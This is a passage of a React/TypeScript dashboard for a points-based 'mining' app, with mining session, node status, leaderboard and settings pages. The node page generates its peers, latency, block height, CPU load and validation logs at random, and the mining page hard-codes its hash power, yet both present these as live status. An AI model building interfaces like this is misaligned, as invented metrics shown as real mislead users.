      </div>
    </div>
  );
};

const MiningPage = ({ miningActive, sessionSecs, onToggleMining }: { miningActive: boolean; sessionSecs: number; onToggleMining: () => void }) => {
  const [todayPoints, setTodayPoints] = useState(0);
  const [weekPoints, setWeekPoints] = useState(0);
  const [totalPoints, setTotalPoints] = useState(0);
  const [events, setEvents] = useState([
    { event: 'Mining session started', time: 'just now', amount: null as string | null },
  ]);
  const [showHistoryModal, setShowHistoryModal] = useState(false);
  const [history, setHistory] = useState<any[]>([]);

  const fetchHistory = async () => {
    try {
      const res = await fetch('/api/mining/history', { credentials: 'include' });
      if (res.ok) {
        const data = await res.json();
        setHistory(data);

        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const weekStart = new Date();
        weekStart.setDate(weekStart.getDate() - 6);
        weekStart.setHours(0, 0, 0, 0);

        const nextTodayPoints = data
          .filter((entry: any) => new Date(entry.startedAt) >= today)
          .reduce((sum: number, entry: any) => sum + Number(entry.pointsEarned || 0), 0);

        const nextWeekPoints = data
          .filter((entry: any) => new Date(entry.startedAt) >= weekStart)
          .reduce((sum: number, entry: any) => sum + Number(entry.pointsEarned || 0), 0);

        setTodayPoints(nextTodayPoints);
        setWeekPoints(nextWeekPoints);
      }
    } catch(e) {}
  };

  useEffect(() => {
    const fetchBalance = async () => {
      try {
        const res = await fetch('/api/wallet/balance', { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setTotalPoints(data.balance);
        }
      } catch(e) {}
    };
    fetchHistory();
    fetchBalance();
    const refresh = () => {
      fetchHistory();
      fetchBalance();
    };
    window.addEventListener('balance-updated', refresh);
    return () => window.removeEventListener('balance-updated', refresh);
  }, []);

  const fTime = (sec: number) => {
    const h = Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const s = sec % 60;
    return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  useEffect(() => {
    if (!miningActive || sessionSecs === 0 || sessionSecs % 60 !== 0) return;
    const minuteEarned = parseFloat((MINING_RATE_PER_SEC * 60).toFixed(4));
    setEvents(ev => [
      { event: `Reward buffered: +${minuteEarned.toFixed(4)} REALM`, time: `${Math.floor(sessionSecs / 60)}m into session`, amount: `+${minuteEarned.toFixed(4)} REALM-P` },
      ...ev.slice(0, 4)
    ]);
  }, [miningActive, sessionSecs]);

  const rate = MINING_RATE_PER_HOUR;
  const sessionPct = Math.min(100, (sessionSecs / SESSION_DURATION) * 100);
  const timeRemaining = SESSION_DURATION - sessionSecs;

  return (
    <div className="space-y-10">
      <section>
<h1 className="text-serif text-6xl font-medium mb-4">Mining <span className="text-realm-cyan">Overview</span></h1>
<p className="text-white/50 font-mono text-sm tracking-wide">Track your current session, earnings, and payout timing.</p>
      </section>

      <div className="grid grid-cols-12 gap-6">
        <div className="col-span-8 glass-panel p-8 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-96 h-96 bg-realm-cyan/5 blur-[120px] -mr-48 -mt-48" />
          <div className="relative z-10">
            <div className="flex justify-between items-start mb-12">
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">Current Mining Session</p>
                <div className="flex items-baseline gap-3">
                  <span className="text-6xl font-medium tracking-tighter font-mono">{fTime(sessionSecs)}</span>
                  {miningActive && <span className="text-realm-cyan font-mono animate-pulse">&#9679; LIVE</span>}
                  {!miningActive && <span className="text-white/30 font-mono">&#9679; IDLE</span>}
                </div>
                <div className="mt-4">
                  <div className="flex justify-between text-[10px] font-mono text-white/40 mb-1">
                    <span>Session progress</span>
                    <span>{sessionPct.toFixed(1)}% &bull; {fTime(timeRemaining)} remaining</span>
                  </div>
                  <div className="h-1.5 bg-white/5 rounded-full overflow-hidden">
                    <motion.div animate={{ width: `${sessionPct}%` }} transition={{ duration: 1 }} className="h-full bg-realm-cyan shadow-[0_0_8px_#3DF2E0]" />
                  </div>
                </div>
              </div>
              <div className="text-right">
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">Earnings Rate</p>
                <p className="text-2xl font-medium text-realm-cyan">+{rate} <span className="text-xs font-mono">REALM-P/hr</span></p>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-8">
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">Efficiency</p>
                <p className="text-xl font-medium">{miningActive ? 'Stable' : 'Idle'}</p>
              </div>
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">Hash Power</p>
                <p className="text-xl font-medium">1.2 GH/s</p>
              </div>
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">Next Payout</p>
                <p className="text-xl font-medium">~{(rate / 60 * 27).toFixed(2)} REALM-P</p>
              </div>
            </div>

            <div className="mt-12 flex items-center gap-6">
              <button
                onClick={() => {
                  onToggleMining();
                  setEvents(ev => [
                    { event: miningActive ? 'Mining session stopped by user' : 'New 6-hour mining session started', time: 'just now', amount: null },
                    ...ev.slice(0, 4)
                  ]);
                }}
                className={cn(
                  "px-8 py-3 rounded-md font-bold text-xs tracking-wide transition-all duration-150",
                  miningActive
                    ? "border border-red-500/20 text-red-400 hover:bg-red-500/10"
                    : "bg-realm-cyan text-realm-black hover:brightness-105"
                )}
              >
                {miningActive ? 'Stop Mining' : 'Start Mining (6h)'}
              </button>
              {miningActive && (
                <div className="text-sm text-white/40 font-mono">
                  Session auto-ends in <span className="text-realm-cyan">{fTime(timeRemaining)}</span>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="col-span-4 glass-panel p-8 flex flex-col justify-between">
          <div>
<h3 className="text-serif text-2xl mb-6">Earnings summary</h3>
            <div className="space-y-6">
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-1">Today</p>
                <p className="text-2xl font-medium">{todayPoints.toFixed(3)} <span className="text-xs text-white/40">REALM-P</span></p>
              </div>
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-1">This Week</p>
                <p className="text-2xl font-medium">{weekPoints.toFixed(2)} <span className="text-xs text-white/40">REALM-P</span></p>
              </div>
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-1">Total Mined</p>
                <p className="text-2xl font-medium text-realm-cyan">{totalPoints.toFixed(2)} <span className="text-xs text-realm-cyan/60">REALM-P</span></p>
              </div>
            </div>
          </div>
          <button onClick={() => setShowHistoryModal(true)} className="w-full py-2.5 border border-realm-border rounded-md text-[10px] font-mono font-bold text-realm-text-secondary uppercase tracking-widest hover:border-white/15 hover:text-realm-text-primary transition-colors mt-8">
            View Detailed History
          </button>
        </div>

        <div className="col-span-12 glass-panel p-8">
<h3 className="text-serif text-2xl mb-6">Recent mining activity</h3>
          <div className="space-y-4">
            {events.map((e, i) => (
              <div key={i} className="flex items-center justify-between py-3 border-b border-white/5 last:border-0">
                <div className="flex items-center gap-4">
                  <div className="w-1.5 h-1.5 rounded-full bg-realm-cyan" />
                  <span className="text-sm text-white/80">{e.event}</span>
                </div>
                <div className="flex items-center gap-6">
                  {e.amount && <span className="text-xs font-mono text-realm-cyan">{e.amount}</span>}
                  <span className="text-xs font-mono text-white/30">{e.time}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Detailed History Modal */}
      {showHistoryModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-realm-surface border border-realm-border p-6 rounded-xl w-[600px] max-w-[90vw] flex flex-col gap-4 max-h-[80vh]">
            <div className="flex justify-between items-center mb-2">
<h2 className="text-lg font-bold text-white flex items-center gap-2"><Activity size={20} className="text-realm-cyan" /> Mining history</h2>
              <button onClick={() => setShowHistoryModal(false)} className="text-white/40 hover:text-white text-xl">&times;</button>
            </div>
            <div className="flex-1 overflow-y-auto space-y-4 pr-2">
              {history.length === 0 ? (
                <p className="text-center text-sm text-white/40 my-8">No mining history found.</p>
              ) : (
                history.map((h, i) => (
                  <div key={i} className="glass-panel p-4 flex justify-between items-center group hover:border-realm-cyan/30 transition-colors">
                    <div>
                      <p className="text-sm font-medium">Session Completed</p>
                      <p className="text-[10px] text-white/40 font-mono mt-1">
                        {new Date(h.startedAt).toLocaleString()} • {Math.floor(h.duration / 3600)}h {Math.floor((h.duration % 3600)/60)}m
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-realm-cyan font-mono text-sm">+{h.pointsEarned.toFixed(3)} REALM-P</p>
                      <p className="text-[10px] text-white/30 font-mono uppercase mt-1">Status: Verified</p>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

    </div>
  );
};

const NodePage = () => {
  const [logs, setLogs] = useState([
    { event: 'Network connection established', time: 'just now', type: 'system' },
  ]);
  const [peers, setPeers] = useState(142);
  const [syncPct, setSyncPct] = useState(98.2);
  const [latency, setLatency] = useState(24);
  const [blockHeight, setBlockHeight] = useState(829102);
  const [restarting, setRestarting] = useState(false);
  const [showRestartConfirm, setShowRestartConfirm] = useState(false);
  const [restartProgress, setRestartProgress] = useState(0);
  const [showLogsModal, setShowLogsModal] = useState(false);

  useEffect(() => {
    const networkEvents = [
      'Proof relay verified',
      'Peer handshake completed',
      'Sync checkpoint reached',
      'Block validation successful',
      'Privacy layer handshake',
      'Consensus achieved',
    ];
    const timer = setInterval(() => {
      setPeers(p => Math.max(100, p + Math.floor(Math.random() * 4) - 1));
      setLatency(l => Math.max(10, l + Math.floor(Math.random() * 6) - 3));
      setSyncPct(s => Math.min(100, parseFloat((s + Math.random() * 0.01).toFixed(2))));
      setBlockHeight(b => b + 1);
      const event = networkEvents[Math.floor(Math.random() * networkEvents.length)];
      setLogs(prev => [
        { event: `${event} (Block #${blockHeight + 1})`, time: 'just now', type: 'network' },
        ...prev.map(l => ({ ...l, time: l.time === 'just now' ? '1m ago' : l.time.includes('m ago') ? `${parseInt(l.time) + 1}m ago` : l.time })).slice(0, 19)
      ]);
    }, 5000);
    return () => clearInterval(timer);
  }, [blockHeight]);

  const confirmRestart = () => {
    setShowRestartConfirm(false);
    setRestarting(true);
    setRestartProgress(0);
    setLogs(prev => [{ event: 'Module restart initiated by user', time: 'just now', type: 'system' }, ...prev.slice(0, 19)]);
    
    let progress = 0;
    const interval = setInterval(() => {
      progress += 10;
      setRestartProgress(progress);
      if (progress >= 100) {
        clearInterval(interval);
        setRestarting(false);
        setLogs(prev => [{ event: 'Module restarted successfully', time: 'just now', type: 'system' }, ...prev.slice(0, 19)]);
      }
    }, 300);
  };

  return (
    <div className="space-y-10">
      <section>
<h1 className="text-serif text-6xl font-medium mb-4">Node <span className="text-realm-cyan">Status</span></h1>
<p className="text-white/50 font-mono text-sm tracking-wide">Monitor performance, peers, and live activity in one place.</p>
      </section>

      <div className="grid grid-cols-12 gap-6">
        <div className="col-span-4 glass-panel p-8 space-y-6">
          <div className="flex items-center justify-between">
            <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest">Node Status</p>
            <div className="flex items-center gap-2">
              <div className={cn("w-2 h-2 rounded-full shadow-[0_0_8px_#3DF2E0]", restarting ? "bg-yellow-400" : "bg-realm-cyan")} />
              <span className={cn("text-xs font-mono", restarting ? "text-yellow-400" : "text-realm-cyan")}>{restarting ? 'RESTARTING' : 'ONLINE'}</span>
            </div>
          </div>
          <div className="space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-white/40">Sync Progress</span>
              <span className="font-mono">{syncPct}%</span>
            </div>
            <div className="h-1 bg-white/5 rounded-full overflow-hidden">
              <motion.div 
                animate={{ width: `${syncPct}%` }}
                transition={{ duration: 1 }}
                className="h-full bg-realm-cyan shadow-[0_0_10px_#3DF2E0]"
              />
            </div>
          </div>
          <div className="grid grid-cols-2 gap-4 pt-4">
            <div className="p-4 bg-white/5 rounded-xl border border-white/10">
              <p className="text-[10px] text-white/40 font-mono uppercase mb-1">Peers</p>
              <p className="text-xl font-medium">{peers}</p>
            </div>
            <div className="p-4 bg-white/5 rounded-xl border border-white/10">
              <p className="text-[10px] text-white/40 font-mono uppercase mb-1">Block</p>
              <p className="text-xl font-medium">#{blockHeight.toLocaleString()}</p>
            </div>
          </div>
        </div>

        <div className="col-span-8 glass-panel p-8">
<h3 className="text-serif text-2xl mb-6">Performance</h3>
          <div className="grid grid-cols-4 gap-6">
            {[
              { label: 'Latency', value: `${latency}ms`, status: latency < 50 ? 'Optimal' : 'Degraded' },
              { label: 'Validation', value: '100%', status: 'Healthy' },
              { label: 'CPU Load', value: `${Math.floor(10 + Math.random() * 5)}%`, status: 'Stable' },
              { label: 'Privacy', value: 'Layer 3', status: 'Active' },
            ].map(m => (
              <div key={m.label} className="space-y-1">
                <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest">{m.label}</p>
                <p className="text-xl font-medium">{m.value}</p>
                <p className={cn("text-[10px] font-mono", m.status === 'Optimal' || m.status === 'Healthy' || m.status === 'Stable' || m.status === 'Active' ? "text-realm-cyan" : "text-yellow-400")}>{m.status}</p>
              </div>
            ))}
          </div>
          <div className="mt-10 pt-10 border-t border-white/5 flex justify-between items-center">
            <div className="space-y-1">
              <p className="text-sm font-medium">Auto-scaling Enabled</p>
              <p className="text-xs text-white/40">System automatically allocates resources based on network demand.</p>
            </div>
            <div className="flex gap-3">
              <button onClick={() => setShowLogsModal(true)} className="px-4 py-2 text-xs font-mono border border-white/10 rounded-lg hover:bg-white/5">View Logs</button>
              <button
                onClick={() => setShowRestartConfirm(true)}
                disabled={restarting}
                className={cn("px-4 py-2 text-xs font-mono rounded-lg font-bold transition-all", restarting ? "bg-yellow-400/20 text-yellow-400 border border-yellow-400/20 cursor-not-allowed" : "bg-realm-cyan text-realm-black hover:brightness-110")}
              >
                {restarting ? `Restarting... ${restartProgress}%` : 'Restart Module'}
              </button>
            </div>
          </div>
        </div>

        <div className="col-span-12 glass-panel p-8">
<h3 className="text-serif text-2xl mb-6">Live node activity <span className="text-xs font-mono text-realm-cyan ml-2 animate-pulse">●  LIVE</span></h3>
          <div className="space-y-3">
            {logs.slice(0, 8).map((log, i) => (
              <motion.div
                key={i}
                initial={i === 0 ? { opacity: 0, x: -10 } : undefined}
                animate={{ opacity: 1, x: 0 }}
                className="flex items-center justify-between py-2.5 border-b border-white/5 last:border-0"
              >
                <div className="flex items-center gap-4">
                  <div className={cn("w-2 h-2 rounded-full", i === 0 ? "bg-realm-cyan animate-pulse" : "bg-realm-cyan/30")} />
                  <span className="text-sm text-white/80">{log.event}</span>
                </div>
                <span className="text-xs font-mono text-white/30">{log.time}</span>
              </motion.div>
            ))}
          </div>
        </div>
      </div>

      {/* Restart Confirm Modal */}
      {showRestartConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-realm-surface border border-realm-border p-6 rounded-xl w-[400px] max-w-[90vw] flex flex-col gap-4">
            <h2 className="text-lg font-bold text-white text-yellow-400 flex items-center gap-2"><Cpu size={20} /> Restart Module?</h2>
            <p className="text-sm text-white/60">This will momentarily disconnect your node from the network. You may lose active peers.</p>
            <div className="flex gap-4 justify-end mt-4">
              <button onClick={() => setShowRestartConfirm(false)} className="px-4 py-2 text-xs font-bold text-white/60 hover:text-white">Cancel</button>
              <button onClick={confirmRestart} className="px-4 py-2 bg-yellow-400 text-black text-xs font-bold rounded hover:bg-yellow-500">Confirm</button>
            </div>
          </div>
        </div>
      )}

      {/* Logs Modal */}
      {showLogsModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-realm-surface border border-realm-border p-6 rounded-xl w-[600px] max-w-[90vw] flex flex-col gap-4 max-h-[80vh]">
            <div className="flex justify-between items-center">
              <h2 className="text-lg font-bold text-white flex items-center gap-2"><Search size={20} /> System Logs</h2>
              <button onClick={() => setShowLogsModal(false)} className="text-white/40 hover:text-white text-xl">&times;</button>
            </div>
            <div className="flex-1 overflow-y-auto bg-black border border-white/5 rounded p-4 font-mono text-xs space-y-2 max-h-[60vh]">
              {logs.map((l, i) => (
                <div key={i} className="flex gap-4 border-b border-white/5 pb-2 last:border-0">
                  <span className="text-white/30 shrink-0">[{l.time.padEnd(8, ' ')}]</span>
                  <span className={l.type === 'system' ? 'text-yellow-400' : 'text-realm-cyan'}>{l.event}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const Leaderboard = () => {
  const [entries, setEntries] = useState<any[]>([]);
  const [networkStats, setNetworkStats] = useState<{ totalUsers: number; activeSessions: number; totalPointsMined: number } | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [lastUpdated, setLastUpdated] = useState(new Date());
  const [copiedEntryId, setCopiedEntryId] = useState<string | null>(null);

  const fetchLeaderboard = async () => {
    setLoading(true);
    setError(null);
    try {
      const [leaderboardRes, statsRes] = await Promise.all([
        fetch('/api/users/leaderboard', { credentials: 'include' }),
        fetch('/api/users/stats', { credentials: 'include' }),
      ]);

      if (!leaderboardRes.ok) {
        throw new Error('Failed to fetch leaderboard data.');
      }

      const leaderboardData = await leaderboardRes.json();
      setEntries(Array.isArray(leaderboardData) ? leaderboardData : []);

      if (statsRes.ok) {
        setNetworkStats(await statsRes.json());
      }

      setLastUpdated(new Date());
    } catch (e: any) {
      setError(e?.message || 'Network error. Could not connect to servers.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLeaderboard();
    const timer = setInterval(fetchLeaderboard, UI_REFRESH_INTERVAL);
    return () => clearInterval(timer);
  }, []);

  const handleCopyPublicId = async (publicId: string) => {
    try {
      await navigator.clipboard.writeText(publicId);
      setCopiedEntryId(publicId);
      setTimeout(() => setCopiedEntryId((current) => (current === publicId ? null : current)), 1500);
    } catch (err) {
      console.error('Failed to copy public ID', err);
    }
  };

  const rankedEntries = entries.slice(0, 100);
  const leader = rankedEntries[0] ?? null;
  const activeCount = rankedEntries.filter((entry) => entry.isOnline || entry.status === 'Active').length;
  const totalTrackedPoints = rankedEntries.reduce((sum, entry) => sum + Number(entry.points || entry.totalPoints || 0), 0);

  return (
    <div className="space-y-8">
      <section className="glass-panel p-6 sm:p-8">
        <div className="flex flex-col gap-6 lg:flex-row lg:items-end lg:justify-between">
          <div className="max-w-3xl">
            <div className="flex flex-wrap items-center gap-3">
              <span className="rounded-full border border-realm-cyan/20 bg-realm-cyan/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-realm-cyan">
                Top 100 contributors
              </span>
              <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/30">
                Updated {lastUpdated.toLocaleTimeString()}
              </span>
            </div>
            <h1 className="mt-5 text-serif text-4xl sm:text-5xl lg:text-6xl">
              A clean ranking of the people moving the network forward.
            </h1>
            <p className="mt-4 max-w-2xl text-sm text-white/45 sm:text-base">
              Just the essentials: rank, public identity, live status, and points.
            </p>
          </div>

          <div className="flex flex-wrap gap-3">
            {[
              { label: 'Tracked', value: networkStats?.totalUsers ?? rankedEntries.length },
              { label: 'Live', value: networkStats?.activeSessions ?? activeCount },
              { label: 'Points', value: Number(networkStats?.totalPointsMined ?? totalTrackedPoints).toFixed(0) },
            ].map((item) => (
              <div key={item.label} className="min-w-[112px] rounded-2xl border border-white/8 bg-white/[0.02] px-4 py-3">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">{item.label}</p>
                <p className="mt-2 text-xl font-semibold text-white">{item.value}</p>
              </div>
            ))}
            <button
              onClick={fetchLeaderboard}
              className="rounded-2xl border border-white/10 px-4 py-3 text-xs font-mono uppercase tracking-[0.18em] text-white/55 hover:border-realm-cyan/30 hover:text-realm-cyan"
            >
              Refresh
            </button>
          </div>
        </div>
      </section>

      {loading ? (
        <div className="glass-panel flex h-64 items-center justify-center">
          <div className="h-10 w-10 animate-spin rounded-full border-2 border-realm-cyan border-t-transparent" />
        </div>
      ) : error ? (
        <div className="glass-panel flex flex-col items-center justify-center gap-4 p-12 text-center">
          <ShieldCheck size={36} className="text-red-400/50" />
          <p className="text-sm text-red-400/80">{error}</p>
          <button onClick={fetchLeaderboard} className="text-xs text-realm-cyan hover:underline">Try Again</button>
        </div>
      ) : entries.length === 0 ? (
        <div className="glass-panel flex flex-col items-center justify-center gap-3 p-12 text-center">
          <Trophy size={36} className="text-white/20" />
          <p className="text-sm text-white/40">No leaderboard data yet.</p>
          <p className="text-xs font-mono text-white/25">Once people connect and start mining, rankings will appear here automatically.</p>
        </div>
      ) : (
        <div className="glass-panel p-4 sm:p-5 lg:p-6">
          <div className="mb-5 flex flex-col gap-4 border-b border-white/5 pb-5 sm:flex-row sm:items-end sm:justify-between">
            <div>
              <h3 className="text-serif text-3xl">Leaderboard</h3>
              <p className="mt-2 text-sm text-white/40">
                Showing the top {rankedEntries.length} contributors with public ids, points, and live status only.
              </p>
            </div>
            {leader && (
              <div className="rounded-2xl border border-realm-cyan/15 bg-realm-cyan/[0.06] px-4 py-3">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-realm-cyan/70">Top contributor</p>
                <p className="mt-2 text-sm font-semibold text-white">{leader.name || leader.publicId}</p>
              </div>
            )}
          </div>

          <div className="space-y-3">
            {rankedEntries.map((entry: any, index: number) => (
              <motion.div
                key={entry.publicId || entry.name || index}
                initial={{ opacity: 0, y: 8 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: Math.min(index * 0.015, 0.35) }}
                className={cn(
                  'rounded-[24px] border px-4 py-4 shadow-[0_14px_40px_rgba(0,0,0,0.14)] transition-colors sm:px-5',
                  index < 3
                    ? 'border-realm-cyan/15 bg-gradient-to-r from-realm-cyan/[0.08] to-transparent hover:border-realm-cyan/30'
                    : 'border-white/8 bg-white/[0.02] hover:border-white/14'
                )}
              >
                <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
                  <div className="flex min-w-0 items-center gap-4">
                    <div className={cn(
                      'flex h-10 w-10 shrink-0 items-center justify-center rounded-2xl border text-[11px] font-mono',
                      index < 3 ? 'border-realm-cyan/25 bg-realm-cyan/10 text-realm-cyan' : 'border-white/10 bg-realm-black/20 text-white/55'
                    )}>
                      #{entry.rank}
                    </div>

                    <LeaderboardAvatar entry={entry} index={index} />

                    <div className="min-w-0">
                      <div className="flex flex-wrap items-center gap-3">
                        <p className="truncate text-sm font-semibold text-white sm:text-base">{entry.name || entry.publicId}</p>
                        <span className={cn(
                          'inline-flex items-center gap-2 rounded-full px-2.5 py-1 text-[10px] font-mono uppercase tracking-[0.18em]',
                          entry.isOnline ? 'bg-realm-cyan/10 text-realm-cyan' : 'bg-white/5 text-white/40'
                        )}>
                          <span className={cn('h-1.5 w-1.5 rounded-full', entry.isOnline ? 'bg-realm-cyan' : 'bg-white/25')} />
                          {entry.isOnline ? 'Live' : 'Idle'}
                        </span>
                      </div>
                      <p className="mt-1 truncate text-xs font-mono uppercase tracking-[0.18em] text-white/30">
                        {entry.publicId}
                      </p>
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center gap-3 lg:justify-end">
                    <div className="rounded-2xl border border-white/8 bg-realm-black/20 px-4 py-3 text-right">
                      <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Points</p>
                      <p className="mt-1 text-lg font-semibold text-white sm:text-xl">
                        {Number(entry.points || entry.totalPoints || 0).toFixed(2)}
                      </p>
                    </div>
                    <button
                      onClick={() => handleCopyPublicId(entry.publicId || entry.username || '')}
                      className={cn(
                        'rounded-2xl border px-4 py-3 text-xs font-mono uppercase tracking-[0.18em] transition-colors',
                        copiedEntryId === (entry.publicId || entry.username)
                          ? 'border-realm-cyan/35 bg-realm-cyan/10 text-realm-cyan'
                          : 'border-white/10 text-white/55 hover:border-realm-cyan/30 hover:text-realm-cyan'
                      )}
                    >
                      {copiedEntryId === (entry.publicId || entry.username) ? 'Copied' : 'Copy id'}
                    </button>
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

const SettingsPage = () => {
  const [preferences, setPreferences] = useState<AppPreferences>(() => loadAppPreferences());
  const [toastMessage, setToastMessage] = useState('');

  const updatePreferences = (updater: (current: AppPreferences) => AppPreferences) => {
    setPreferences((current) => updater(current));
  };

  const notify = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(''), 3000);
  };

  const trustNotes = [
    preferences.notifications.securityAlerts
      ? 'Security notifications stay on, so account state changes remain visible.'
      : 'Security notifications are muted, so identity changes can be easier to miss.',
    preferences.workspace.hidePointBalance
      ? 'Balances are masked in the workspace to reduce shoulder-surfing risk.'
      : 'Balances are visible in the workspace for faster operator scanning.',
    preferences.privacy.profileVisibility === 'private'
      ? 'Profile discovery is locked down to direct account access only.'
      : preferences.privacy.profileVisibility === 'network'
        ? 'Profile details are shared in a limited, network-facing way.'
        : 'Profile is configured for public sharing, which is lower-trust by default.',
  ];

  return (
    <div className="max-w-4xl mx-auto space-y-10 relative">
      {toastMessage && (
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="absolute top-0 right-0 py-3 px-6 bg-realm-cyan/20 border border-realm-cyan text-realm-cyan rounded-lg text-sm font-bold shadow-[0_0_20px_rgba(61,242,224,0.3)] z-50"
        >
          {toastMessage}
        </motion.div>
      )}

      <section>
        <div>
          <h1 className="text-serif text-5xl font-medium mb-4">Account <span className="text-realm-cyan">Settings</span></h1>
          <p className="max-w-2xl text-white/50 font-mono text-sm tracking-wide">
            Adjust refresh behavior, alerts, and privacy settings for this browser.
          </p>
        </div>
      </section>

      <div className="grid gap-4 md:grid-cols-3">
        {[
          {
            label: 'Refresh cadence',
            value: formatRefreshInterval(preferences.workspace.refreshIntervalMs),
            detail: 'Controls wallet and surface polling interval.',
          },
          {
            label: 'Profile exposure',
            value: getProfileVisibilityLabel(preferences.privacy.profileVisibility),
            detail: 'Sets how aggressively the workspace reveals your identity.',
          },
          {
            label: 'Balance visibility',
            value: preferences.workspace.hidePointBalance ? 'Masked' : 'Visible',
            detail: 'Applied to shared workspace surfaces such as the top bar.',
          },
        ].map((item) => (
          <div key={item.label} className="glass-panel p-6">
            <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">{item.label}</p>
            <p className="mt-3 text-2xl font-semibold text-white">{item.value}</p>
            <p className="mt-2 text-sm text-white/40">{item.detail}</p>
          </div>
        ))}
      </div>

      <div className="glass-panel p-8 space-y-6">
        <div className="flex items-start justify-between gap-4">
          <div>
            <h3 className="text-serif text-3xl">Workspace behavior</h3>
            <p className="mt-2 text-sm text-white/40">
              Decide how actively the app refreshes and how much balance detail stays visible on screen.
            </p>
          </div>
          <div className="rounded-full border border-white/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-white/45">
            Browser local
          </div>
        </div>

        <div className="space-y-6">
          <div className="flex flex-col gap-4 border-b border-white/5 pb-6 md:flex-row md:items-center md:justify-between">
            <div className="space-y-1">
              <p className="font-medium text-white">Auto refresh cadence</p>
              <p className="text-xs text-white/40 font-mono">Choose how often the dashboard refreshes while you keep it open.</p>
            </div>
            <div className="flex flex-wrap gap-2">
              {[15000, 60000, 180000].map((value) => (
                <button
                  key={value}
                  onClick={() => updatePreferences((current) => ({
                    ...current,
                    workspace: { ...current.workspace, refreshIntervalMs: value },
                  }))}
                  className={cn(
                    'rounded-full border px-4 py-2 text-xs font-semibold transition-all',
                    preferences.workspace.refreshIntervalMs === value
                      ? 'border-realm-cyan bg-realm-cyan text-realm-black'
                      : 'border-white/10 text-white/60 hover:border-white/25 hover:text-white'
                  )}
                >
                  {value === 15000 ? 'Fast 15s' : value === 60000 ? 'Balanced 1m' : 'Light 3m'}
                </button>
              ))}
            </div>
          </div>

          <div className="flex items-center justify-between gap-4">
            <div className="space-y-1 pr-6">
              <p className="font-medium text-white">Hide point balances on shared screens</p>
              <p className="text-xs text-white/40 font-mono">Hide balances in the top bar and other shared parts of the app on this browser.</p>
            </div>
            <button
              onClick={() => updatePreferences((current) => ({
                ...current,
                workspace: { ...current.workspace, hidePointBalance: !current.workspace.hidePointBalance },
              }))}
              className={cn(
                'w-12 h-6 rounded-full p-1 transition-colors duration-300',
                preferences.workspace.hidePointBalance ? 'bg-realm-cyan' : 'bg-white/10'
              )}
            >
              <div className={cn('w-4 h-4 bg-white rounded-full transition-transform duration-300', preferences.workspace.hidePointBalance ? 'translate-x-6' : 'translate-x-0')} />
            </button>
          </div>
        </div>
      </div>

      <div className="glass-panel p-8 space-y-6">
        <div className="flex items-start justify-between gap-4">
          <div>
            <h3 className="text-serif text-3xl">Notifications that matter</h3>
            <p className="mt-2 text-sm text-white/40">
              Keep the feed focused on meaningful account changes instead of background noise.
            </p>
          </div>
          <div className="rounded-full border border-white/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-white/45">
            Workspace feed
          </div>
        </div>

        <div className="space-y-5">
          {[
            {
              key: 'rewardAlerts',
              title: 'Reward and payout alerts',
              description: 'Surface credited balances, mining sync events, and successful claims in the operator feed.',
            },
            {
              key: 'taskAlerts',
              title: 'Task unlock reminders',
              description: 'Highlight when profile or social actions become eligible so the dashboard feels actionable.',
            },
            {
              key: 'securityAlerts',
              title: 'Identity and security notices',
              description: 'Warn when recovery posture is weak or when too few providers are linked for safe access recovery.',
            },
          ].map((item) => (
            <div key={item.key} className="flex items-center justify-between gap-4 border-b border-white/5 pb-5 last:border-0 last:pb-0">
              <div className="space-y-1 pr-6">
                <p className="font-medium text-white">{item.title}</p>
                <p className="text-xs text-white/40 font-mono">{item.description}</p>
              </div>
              <button
                onClick={() => updatePreferences((current) => ({
                  ...current,
                  notifications: {
                    ...current.notifications,
                    [item.key]: !current.notifications[item.key as keyof AppPreferences['notifications']],
                  },
                }))}
                className={cn(
